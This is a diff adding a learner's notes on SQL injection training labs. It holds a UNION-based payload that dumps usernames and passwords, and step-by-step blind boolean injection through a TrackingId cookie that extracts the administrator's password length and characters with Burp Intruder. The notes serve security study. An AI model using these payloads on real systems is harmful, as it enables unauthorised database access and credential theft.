@@ -102,3 +102,28 @@ PASSWORD_TYRFNT
 USERNAME_AIPDKN
 '+UNION+SELECT+USERNAME_AIPDKN,PASSWORD_TYRFNT+FROM+USERS_ICXPNX--
 Log in using administrator and password.
+
+# BLIND SQL INJECTIONS
+
+### Lab: Blind SQL injection with conditional responses
+
+Hint: You can assume that the password only contains lowercase, alphanumeric characters.  
+intercept, reload, repeater, see Cookie: tracking-ID=  
+use booleans EX: Cookie: TrackingId=AfmV0i55jXUHch34' AND '1'='1;  
+search for 'Welcome back' string shows that it's injectable  
+if boolean is a false and doesn't give 500 error, it shows it's injectable.  
+intercept -> repeater -> send to intruder  
+intruder -> clear positions -> trackingId position, figure out length of password.  
+ex: TrackingId=skE2Uot3KwnNY4m0' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a;  
+highlight '1' click add in intruder  
+ex:' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§)='a; session=80ZmlNFRn852B56JEPNfCP8hWIoUQcZX  
+payload -> type -> numbers -> from 1 to 30(super secure) step = 1.  
+options tab -> grep match -> clear -> add "Welcome" we know logged in users see "Welcome back!"  
+ex: TrackingId=skE2Uot3KwnNY4m0' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§)='a;  
+intruder -> clusterbomb(two payloads)  
+TrackingId=skE2Uot3KwnNY4m0' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a;  
+select payloads  
+Cookie: TrackingId=skE2Uot3KwnNY4m0' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§;  
+payload 1 -> numbers 1-20(we know PW is 20 long from prior step) step 1  
+payload 2 -> simple list ->payload options -> add a-z and 0-9  
+Start attack, wait for 30 minutes, order results
